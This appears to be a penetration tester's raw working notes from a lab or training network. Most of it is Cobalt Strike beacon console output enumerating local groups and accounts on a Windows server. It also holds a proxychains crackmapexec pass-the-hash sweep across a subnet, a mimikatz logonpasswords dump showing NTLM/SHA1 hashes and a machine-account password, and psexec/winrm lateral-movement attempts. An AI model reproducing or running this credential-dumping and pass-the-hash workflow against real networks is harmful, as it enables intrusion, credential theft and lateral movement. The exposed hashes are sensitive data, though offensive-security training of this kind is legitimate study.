[10/06 16:35:30] [+] host called home, sent: 66 bytes
[10/06 16:35:31] [+] received output:
The syntax of this command is:



NET LOCALGROUP

[groupname [/COMMENT:"text"]] [/DOMAIN]

              groupname {/ADD [/COMMENT:"text"] | /DELETE}  [/DOMAIN]

              groupname name [...] {/ADD | /DELETE} [/DOMAIN]




[10/06 16:35:41] beacon> shell net localgroup "Remote Desktop Users"
[10/06 16:35:41] [*] Tasked beacon to run: net localgroup "Remote Desktop Users"
[10/06 16:35:46] [+] host called home, sent: 68 bytes
[10/06 16:35:46] [+] received output:
Alias name     Remote Desktop Users

Comment        Members in this group are granted the right to logon remotely



Members



-------------------------------------------------------------------------------

The command completed successfully.




[10/06 16:35:57] beacon> shell net localgroup
[10/06 16:35:57] [*] Tasked beacon to run: net localgroup
[10/06 16:36:02] [+] host called home, sent: 45 bytes
[10/06 16:36:02] [+] received output:


Aliases for \\MS01



-------------------------------------------------------------------------------

*Access Control Assistance Operators

*Administrators

*Backup Operators

*Certificate Service DCOM Access

*Cryptographic Operators

*Distributed COM Users

*Event Log Readers

*Guests

*Hyper-V Administrators

*IIS_IUSRS

*Network Configuration Operators

*Performance Log Users

*Performance Monitor Users

*Power Users

*Print Operators

*RDS Endpoint Servers

*RDS Management Servers

*RDS Remote Access Servers

*Remote Desktop Users

*Remote Management Users

*Replicator

*Storage Replica Administrators

*System Managed Accounts Group

*Users

The command completed successfully.




[10/06 16:36:17] beacon> shell net localgroup Administrator
[10/06 16:36:17] [*] Tasked beacon to run: net localgroup Administrator
[10/06 16:36:17] [+] host called home, sent: 59 bytes
[10/06 16:36:17] [+] received output:
System error 1376 has occurred.



The specified local group does not exist.




[10/06 16:36:29] beacon> shell net localgroup Administrators
[10/06 16:36:29] [*] Tasked beacon to run: net localgroup Administrators
[10/06 16:36:33] [+] host called home, sent: 60 bytes
[10/06 16:36:33] [+] received output:
Alias name     Administrators

Comment        Administrators have complete and unrestricted access to the computer/domain



Members



-------------------------------------------------------------------------------

Administrator

CORP\Domain Admins

CORP\svc_opmanager

justalocaladmin

The command completed successfully.




[10/06 16:37:13] beacon> shell net users justalocaladmin
[10/06 16:37:13] [*] Tasked beacon to run: net users justalocaladmin
[10/06 16:37:14] [+] host called home, sent: 56 bytes
[10/06 16:37:15] [+] received output:
User name                    justalocaladmin

Full Name                    

Comment                      

User's comment               

Country/region code          000 (System Default)

Account active               Yes

Account expires              Never



Password last set            10/6/2023 10:38:37 AM

Password expires             Never

Password changeable          10/7/2023 10:38:37 AM

Password required            Yes

User may change password     Yes



Workstations allowed         All

Logon script                 

User profile                 

Home directory               

Last logon                   Never



Logon hours allowed          All



Local Group Memberships      *Administrators       *Users                

Global Group memberships     *None                 

The command completed successfully.




[10/06 16:37:30] beacon> shell net localgroup Administrators
[10/06 16:37:30] [*] Tasked beacon to run: net localgroup Administrators
[10/06 16:37:35] [+] host called home, sent: 60 bytes
[10/06 16:37:35] [+] received output:
Alias name     Administrators

Comment        Administrators have complete and unrestricted access to the computer/domain



Members



-------------------------------------------------------------------------------

Administrator

CORP\Domain Admins

CORP\svc_opmanager

justalocaladmin

The command completed successfully.




[10/06 16:38:04] beacon> shell net localgroup "CORP\Domain Admins"
[10/06 16:38:04] [*] Tasked beacon to run: net localgroup "CORP\Domain Admins"
[10/06 16:38:06] [+] host called home, sent: 66 bytes
[10/06 16:38:06] [+] received output:
The syntax of this command is:



NET LOCALGROUP

[groupname [/COMMENT:"text"]] [/DOMAIN]

              groupname {/ADD [/COMMENT:"text"] | /DELETE}  [/DOMAIN]

              groupname name [...] {/ADD | /DELETE} [/DOMAIN]




[10/06 16:38:41] beacon> shell net localgroup
[10/06 16:38:41] [*] Tasked beacon to run: net localgroup
[10/06 16:38:42] [+] host called home, sent: 45 bytes
[10/06 16:38:42] [+] received output:


Aliases for \\MS01



-------------------------------------------------------------------------------

*Access Control Assistance Operators

*Administrators

*Backup Operators

*Certificate Service DCOM Access

*Cryptographic Operators

*Distributed COM Users

*Event Log Readers

*Guests

*Hyper-V Administrators

*IIS_IUSRS

*Network Configuration Operators

*Performance Log Users

*Performance Monitor Users

*Power Users

*Print Operators

*RDS Endpoint Servers

*RDS Management Servers

*RDS Remote Access Servers

*Remote Desktop Users

*Remote Management Users

*Replicator

*Storage Replica Administrators

*System Managed Accounts Group

*Users

The command completed successfully.




[10/06 16:38:58] beacon> shell net localgroup "*Remote Desktop Users"
[10/06 16:38:58] [*] Tasked beacon to run: net localgroup "*Remote Desktop Users"
[10/06 16:39:03] [+] host called home, sent: 69 bytes
[10/06 16:39:03] [+] received output:
The syntax of this command is:



NET LOCALGROUP

[groupname [/COMMENT:"text"]] [/DOMAIN]

              groupname {/ADD [/COMMENT:"text"] | /DELETE}  [/DOMAIN]

              groupname name [...] {/ADD | /DELETE} [/DOMAIN]




[10/06 16:39:16] beacon> shell net localgroup "Remote Desktop Users"
[10/06 16:39:16] [*] Tasked beacon to run: net localgroup "Remote Desktop Users"
[10/06 16:39:18] [+] host called home, sent: 68 bytes
[10/06 16:39:19] [+] received output:
Alias name     Remote Desktop Users

Comment        Members in this group are granted the right to logon remotely



Members



-------------------------------------------------------------------------------

The command completed successfully.




[10/06 16:39:37] beacon> shell net localgroup "Power Users"
[10/06 16:39:37] [*] Tasked beacon to run: net localgroup "Power Users"
[10/06 16:39:39] [+] host called home, sent: 59 bytes
[10/06 16:39:39] [+] received output:
Alias name     Power Users

Comment        Power Users are included for backwards compatibility and possess limited administrative powers



Members



-------------------------------------------------------------------------------

The command completed successfully.




[10/06 16:39:57] beacon> shell net user "Administrator"
[10/06 16:39:57] [*] Tasked beacon to run: net user "Administrator"
[10/06 16:40:00] [+] host called home, sent: 55 bytes
[10/06 16:40:00] [+] received output:
User name                    Administrator

Full Name                    

Comment                      Built-in account for administering the computer/domain

User's comment               

Country/region code          000 (System Default)

Account active               No

Account expires              Never



Password last set            3/28/2018 3:51:52 PM

Password expires             Never

Password changeable          3/29/2018 3:51:52 PM

Password required            Yes

User may change password     Yes



Workstations allowed         All

Logon script                 

User profile                 

Home directory               

Last logon                   4/20/2018 7:09:36 AM



Logon hours allowed          All



Local Group Memberships      *Administrators       

Global Group memberships     *None                 

The command completed successfully.




[10/06 16:40:35] beacon> shell net users justalocaladmin
[10/06 16:40:35] [*] Tasked beacon to run: net users justalocaladmin
[10/06 16:40:36] [+] host called home, sent: 56 bytes
[10/06 16:40:36] [+] received output:
User name                    justalocaladmin

Full Name                    

Comment                      

User's comment               

Country/region code          000 (System Default)

Account active               Yes

Account expires              Never



Password last set            10/6/2023 10:38:37 AM

Password expires             Never

Password changeable          10/7/2023 10:38:37 AM

Password required            Yes

User may change password     Yes



Workstations allowed         All

Logon script                 

User profile                 

Home directory               

Last logon                   Never



Logon hours allowed          All



Local Group Memberships      *Administrators       *Users                

Global Group memberships     *None                 

The command completed successfully.




[10/06 16:40:51] beacon> shell net localgroup Users
[10/06 16:40:51] [*] Tasked beacon to run: net localgroup Users
[10/06 16:40:51] [+] host called home, sent: 51 bytes
[10/06 16:40:51] [+] received output:
Alias name     Users

Comment        Users are prevented from making accidental or intentional system-wide changes and can run most applications



Members



-------------------------------------------------------------------------------

CORP\Domain Users

justalocaladmin

NT AUTHORITY\Authenticated Users

NT AUTHORITY\INTERACTIVE

The command completed successfully.




[10/06 16:41:17] beacon> shell net localgroup "CORP\Domain Users"
[10/06 16:41:17] [*] Tasked beacon to run: net localgroup "CORP\Domain Users"
[10/06 16:41:22] [+] host called home, sent: 65 bytes
[10/06 16:41:22] [+] received output:
The syntax of this command is:



NET LOCALGROUP

[groupname [/COMMENT:"text"]] [/DOMAIN]

              groupname {/ADD [/COMMENT:"text"] | /DELETE}  [/DOMAIN]

              groupname name [...] {/ADD | /DELETE} [/DOMAIN]



```
Blasting cme across 172.16.1.0/24 to see if hash goes anywhere else
proxychains crackmapexec smb 172.16.1.0/24 -u administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth

```powershell
[rootðŸ’€/opt/cobaltstrike] [10.10.14.39] [2023-10-06 16:44:46] 
 â””â”€â•¼ # proxychains crackmapexec smb 172.16.1.0/24 -u administrator -H 7facdc498ed1680c4fd1448319a8c04f --local-auth
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
SMB         172.16.1.5      445    DC01             [*] Windows Server 2016 Standard 14393 x64 (name:DC01) (domain:DC01) (signing:True) (SMBv1:True)
SMB         172.16.1.36     445    WSADM            [*] Windows 10.0 Build 17134 x64 (name:WSADM) (domain:WSADM) (signing:False) (SMBv1:False)
SMB         172.16.1.26     445    FS01             [*] Windows Server 2016 Standard 14393 x64 (name:FS01) (domain:FS01) (signing:False) (SMBv1:True)
SMB         172.16.1.30     445    MS01             [*] Windows Server 2016 Standard 14393 x64 (name:MS01) (domain:MS01) (signing:False) (SMBv1:True)
SMB         172.16.1.15     445    SQL01            [*] Windows Server 2016 Standard 14393 x64 (name:SQL01) (domain:SQL01) (signing:False) (SMBv1:True)
SMB         172.16.1.24     445    WEB-WIN01        [*] Windows 10.0 Build 14393 x64 (name:WEB-WIN01) (domain:WEB-WIN01) (signing:False) (SMBv1:False)
SMB         172.16.1.101    445    WS02             [*] Windows 7 Professional 7601 Service Pack 1 x64 (name:WS02) (domain:WS02) (signing:False) (SMBv1:True)
SMB         172.16.1.5      445    DC01             [-] DC01\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         172.16.1.36     445    WSADM            [-] WSADM\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         172.16.1.26     445    FS01             [-] FS01\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_ACCOUNT_DISABLED 
SMB         172.16.1.30     445    MS01             [-] MS01\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_ACCOUNT_DISABLED 
SMB         172.16.1.15     445    SQL01            [-] SQL01\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_ACCOUNT_DISABLED 
SMB         172.16.1.24     445    WEB-WIN01        [-] WEB-WIN01\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         172.16.1.101    445    WS02             [-] WS02\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         172.16.1.200    445    DC0              [*] Windows 10.0 Build 17763 x64 (name:DC0) (domain:DC0) (signing:True) (SMBv1:False)
SMB         172.16.1.201    445    JOE-LPTP         [*] Windows 10.0 Build 19041 x64 (name:JOE-LPTP) (domain:JOE-LPTP) (signing:False) (SMBv1:False)
SMB         172.16.1.200    445    DC0              [-] DC0\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         172.16.1.201    445    JOE-LPTP         [-] JOE-LPTP\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 
SMB         172.16.1.220    445    SRV01            [*] Windows Server 2016 Standard 14393 x64 (name:SRV01) (domain:SRV01) (signing:True) (SMBv1:True)
SMB         172.16.1.220    445    SRV01            [-] SRV01\administrator:7facdc498ed1680c4fd1448319a8c04f STATUS_LOGON_FAILURE 

- Might be able to get to SRV01 with hashes
- portscan 172.16.1.220 1-1024,5000-6000 arp 1024

```
dumped hashes from memory
```powershell
[10/06 16:57:34] beacon> mimikatz !sekurlsa::logonpasswords
[10/06 16:58:00] [*] Tasked beacon to run mimikatz's !sekurlsa::logonpasswords command
[10/06 16:58:05] [+] host called home, sent: 813691 bytes
[10/06 16:58:08] [+] received output:

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-18
	msv :	
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 37959328 (00000000:024336a0)
Session           : NewCredentials from 0
User Name         : SYSTEM
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/6/2023 12:20:30 PM
SID               : S-1-5-18
	msv :	
	 [00000003] Primary
	 * Username : Administrator
	 * Domain   : CORP
	 * NTLM     : 7facdc498ed1680c4fd1448319a8c04f
	tspkg :	
	wdigest :	
	 * Username : Administrator
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : Administrator
	 * Domain   : CORP
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 996 (00000000:000003e4)
Session           : Service from 0
User Name         : MS01$
Domain            : CORP
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-20
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : ms01$
	 * Domain   : CORP.LOCAL
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 997 (00000000:000003e5)
Session           : Service from 0
User Name         : LOCAL SERVICE
Domain            : NT AUTHORITY
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-19
	msv :	
	tspkg :	
	wdigest :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	kerberos :	
	 * Username : (null)
	 * Domain   : (null)
	 * Password : (null)
	ssp :	
	credman :	

Authentication Id : 0 ; 66631 (00000000:00010447)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	ssp :	
	credman :	

Authentication Id : 0 ; 66237 (00000000:000102bd)
Session           : Interactive from 1
User Name         : DWM-1
Domain            : Window Manager
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : S-1-5-90-0-1
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	 * Username : MS01$
	 * Domain   : CORP
	 * Password : (null)
	kerberos :	
	 * Username : MS01$
	 * Domain   : corp.local
	 * Password : 4G27%CXs#vdBm&ZyC@OA4@[H3%F;fksT[tUqML/4AYDJ^(sxXUqQWdT"!WdPj$HC(Pj1d0r75fV<FhyE$u3lAT7@CGiiP-si[D[jzHxtsi40iw ;]H6jh)Bm
	ssp :	
	credman :	

Authentication Id : 0 ; 35813 (00000000:00008be5)
Session           : UndefinedLogonType from 0
User Name         : (null)
Domain            : (null)
Logon Server      : (null)
Logon Time        : 10/5/2023 9:39:07 AM
SID               : 
	msv :	
	 [00000003] Primary
	 * Username : MS01$
	 * Domain   : CORP
	 * NTLM     : b0008678126a9a7143961c96161725a4
	 * SHA1     : 570e49936ec2e700501645c102f53b64f66be28d
	tspkg :	
	wdigest :	
	kerberos :	
	ssp :	
	credman :	

```

- Probably have to chain proxychains together from NIX01 to MS01 (through cobalt strike) to internal devices


jump psexec64 WSADM.corp.local smb  // nope didnt work
jump winrm63 WSADM.corp.local smb 


jump psexec64 172.16.1.220 smb  // nope didnt work
jump winrm63 172.16.1.220 smb 
172.16.1.220
Watch this for pivoting
https://www.youtube.com/watch?v=QlotGFMuRBA

Burnt out for the day, calling it quits.
Need to figure out where the administrator NTLM hashes are able to go.